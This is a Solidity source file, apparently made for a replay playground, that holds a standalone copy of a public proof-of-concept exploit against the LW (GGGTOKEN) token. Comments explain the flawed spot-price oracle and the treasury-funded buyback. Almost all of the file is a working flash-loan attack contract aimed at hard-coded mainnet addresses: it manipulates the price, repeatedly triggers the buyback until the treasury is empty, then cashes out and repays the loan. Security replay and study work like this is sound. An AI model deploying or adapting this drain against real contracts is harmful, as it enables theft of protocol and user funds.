// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-05-LW).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// harness — the PancakeSwap flash-swap callback `pancakeCall` lives on the test
// itself (`to = address(this)` is both the flash borrower and the swap recipient),
// so there is no standalone contract to deploy. This file is a faithful,
// self-contained copy of that inline attack (testExploit body → run();
// pancakeCall callback + helpers inlined), compiled inside the registry forge
// project. Logic and constants are copied verbatim from test/LW_exp.sol.
//
// Root cause: the LW token (GGGTOKEN) derives its price from the raw, in-block
// PancakeSwap LP ratio via `getTokenPrice()`, and its `receive()` fallback —
// callable by anyone — spends 3,000 USDT of the protocol's own treasury
// (`_marketAddr`) per poke to "buy back & burn" LW (swapping treasury USDT INTO
// the LP). The attacker flash-borrows USDT, dumps it into the LP to spike the
// spot oracle ~118x, then loops: a dust LW transfer to the pair (whose USD
// value is inflated past the 2500e18 gate) arms `thanPrice`, and a 1-wei poke
// of `receive()` forces the protocol to pour 3,000 USDT of treasury into the LP.
// After ~93 pokes the treasury is empty and the LP is fattened with its money;
// the attacker then dumps its accumulated LW back into the enriched pool and
// repays the flash loan, netting ~83,476 USDT.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface ILW {
    function getTokenPrice() external view returns (uint256);
    function thanPrice() external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract LWOracleDrain {
    // --- victims / constants (copied verbatim from test/LW_exp.sol) ------------
    address constant LW_TOKEN = 0x7B8C378df8650373d82CeB1085a18FE34031784F; // GGGTOKEN
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant PAIR = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE; // flash-swap lender
    address constant LP = 0x6D2D124acFe01c2D2aDb438E37561a0269C6eaBB; // LW/USDT victim pool
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant MARKET_ADDR = 0xae2f168900D5bb38171B01c2323069E5FD6b57B9; // treasury

    // step 0: flash-borrow 1,000,000 USDT from the USDT-side Pair. The callback
    // below spikes the oracle, drains the treasury into the LP, cashes out, and
    // repays. A small msg.value (sent with this call) funds the 1-wei receive()
    // pokes in the loop — the deployer funds it via setup.fundAttackerWei +
    // attackValueWei (the recorder sends that much native ETH with run()).
    function run() external payable {
        IUniswapV2Pair(PAIR).swap(1_000_000 * 1e18, 0, address(this), new bytes(1));
    }

    // PancakeSwap V2 flash-swap callback. The pair optimistically sent 1,000,000
    // USDT; here the attacker pumps the spot price, loops the protocol's
    // treasury-funded buyback to enrich the LP, dumps the accumulated LW back
    // into the fattened pool, and repays the flash swap.
    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        usdtToLW();
        while (IERC20(USDT).balanceOf(MARKET_ADDR) > 3000 * 1e18) {
            ILW(LW_TOKEN).thanPrice();
            uint256 transferAmount = 2510e18 * 1e18 / ILW(LW_TOKEN).getTokenPrice();
            ILW(LW_TOKEN).transfer(LP, transferAmount);
            ILW(LW_TOKEN).thanPrice();
            IUniswapV2Pair(LP).skim(address(this));
            payable(LW_TOKEN).call{value: 1}(""); // trigger receive() -> swap 3000 USDT into LP
        }
        lwToUSDT();
        IERC20(USDT).transfer(PAIR, 1_002_507 * 1e18); // repay flash swap (principal + 0.25% fee)
    }

    function usdtToLW() internal {
        IERC20(USDT).approve(ROUTER, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = USDT;
        path[1] = LW_TOKEN;
        IUniswapV2Router02(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(USDT).balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function lwToUSDT() internal {
        ILW(LW_TOKEN).approve(ROUTER, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = LW_TOKEN;
        path[1] = USDT;
        IUniswapV2Router02(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(LW_TOKEN).balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
